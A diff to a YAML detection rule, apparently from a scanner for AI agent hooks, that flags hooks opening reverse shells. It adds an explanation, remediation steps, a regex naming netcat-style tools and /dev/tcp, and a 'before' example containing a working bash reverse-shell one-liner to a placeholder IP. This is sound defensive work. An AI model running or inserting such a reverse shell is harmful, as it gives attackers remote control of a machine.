@@ -6,6 +6,30 @@ weight: 25
 status: shadow
 shadowUntil: 2026-W3-end
 appliesTo: [hooks]
+title: >-
+  Hook opens a reverse shell or raw outbound socket
+explanation: >-
+  This hook runs automatically on an agent event. The spotted command <code>{match}</code>
+  wires a shell to an outbound TCP socket (netcat or <code>/dev/tcp</code>) — a reverse shell
+  that hands an attacker persistent, interactive access to your machine the moment it runs.
+categoryLabel: >-
+  Remote code execution
+severityRationale: >-
+  the hook can establish a persistent backdoor automatically, with no human in the loop.
+remediation:
+  action: >-
+    Remove the reverse-shell / raw-socket call; a hook has no legitimate need for one.
+  steps:
+    - >-
+      Delete any <code>nc</code>/<code>ncat</code>/<code>socat</code> or <code>/dev/tcp</code> shell pipe.
+    - >-
+      If the hook genuinely needs to call out, use an explicit HTTPS request to a named host.
+  saferPattern:
+    before: |-
+      bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
+    after: |-
+      # No outbound shell. If a network call is needed, make it explicit:
+      curl -fsSL https://status.example.com/ping
 trigger:
   type: regex_match
   pattern: '(?i)\b(?:nc|netcat|ncat|socat)\s+(?:-[a-z]+\s+)*\S+\s+\d+|/dev/tcp/\S+/\d+|bash\s+-i\s+>&\s*/dev/tcp/'
